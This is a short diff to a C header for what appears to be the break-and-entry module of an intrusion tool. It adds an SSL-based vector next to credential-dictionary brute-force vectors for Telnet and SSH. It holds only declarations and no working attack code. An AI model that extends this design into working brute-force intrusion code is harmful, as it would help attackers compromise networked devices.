@@ -4,6 +4,7 @@
 #include <inttypes.h>
 #include <stdbool.h>
 
+#include <mbedtls/ssl.h>
 #include <mbedtls/ctr_drbg.h>
 
 #include "pth.h"
@@ -19,6 +20,7 @@ typedef struct prne_bne_result prne_bne_result_t;
 
 enum prne_bne_vector {
 	PRNE_BNE_V_NONE = -1,
+	PRNE_BNE_V_HTBT,
 	PRNE_BNE_V_BRUTE_TELNET,
 	PRNE_BNE_V_BRUTE_SSH,
 	NB_PRNE_BNE_V
@@ -27,6 +29,7 @@ typedef enum prne_bne_vector prne_bne_vector_t;
 
 struct prne_bne_param {
 	const prne_cred_dict_t *cred_dict;
+	mbedtls_ssl_config *htbt_ssl_conf;
 	struct {
 		const prne_bne_vector_t *arr;
 		size_t cnt;
